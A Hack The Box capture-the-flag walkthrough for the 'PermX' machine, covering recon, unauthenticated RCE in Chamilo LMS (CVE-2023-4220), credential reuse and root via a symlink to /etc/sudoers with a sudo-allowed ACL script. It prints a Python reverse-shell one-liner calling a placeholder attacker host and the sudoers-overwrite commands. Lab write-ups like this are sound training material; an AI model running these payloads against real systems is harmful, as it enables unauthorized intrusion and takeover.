🧠 HTB: PermX Walkthrough

    Difficulty: Easy-Medium
    Author: pk2212
    Exploitation: Chamilo CVE-2023-4220 → Password reuse → Privilege Escalation via sudo-abused script

TL;DR Summary

    Gained initial access via an unauthenticated RCE in Chamilo LMS (CVE-2023–4220)

    Discovered password reuse for user mtz via LinPEAS

    Escalated privileges to root using sudo access on a custom script (/opt/acl.sh)

🔎 Recon

A quick nmap scan revealed:

22/tcp  open  ssh  
80/tcp  open  http

The main website on port 80 lacked any useful functionality, so I moved on to content discovery. Using ffuf, I discovered a subdomain:

lms.permx.htb

This led to a Chamilo LMS login portal.
⚔️ Exploitation (Initial Access)

I looked up public exploits for Chamilo and found CVE-2023-4220 — an unauthenticated RCE via file upload.

Using the provided Python PoC, I obtained a working webshell and then upgraded to a reverse shell using the Python3 one-liner from revshells.com.

# Reverse shell payload
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

🎯 Got a shell as www-data.
🧬 Post-Exploitation & Privilege Escalation

After basic manual enumeration, I ran LinPEAS, which revealed a password in Chamilo’s config file.

This password successfully worked for SSH login as user mtz.

ssh mtz@permx.htb

✅ user.txt captured.
🚀 Root Access

As mtz, I had sudo rights to execute:

/opt/acl.sh

Reading the script revealed it manipulated file permissions.

To abuse this, I created a symlink named file pointing to /etc/sudoers.

ln -s /etc/sudoers file
sudo /opt/acl.sh file read write

Opening the file symlink gave access to /etc/sudoers. I modified it to grant mtz passwordless root:

mtz ALL=(ALL) NOPASSWD:ALL

Then simply ran:

sudo su

🎉 Root access achieved.
📄 Grabbed root.txt.
✅ Conclusion

    ✅ Enumerated services & subdomains

    ✅ Exploited Chamilo LMS for unauthenticated RCE

    ✅ Found user creds via LinPEAS

    ✅ PrivEsc via abused custom sudo script****
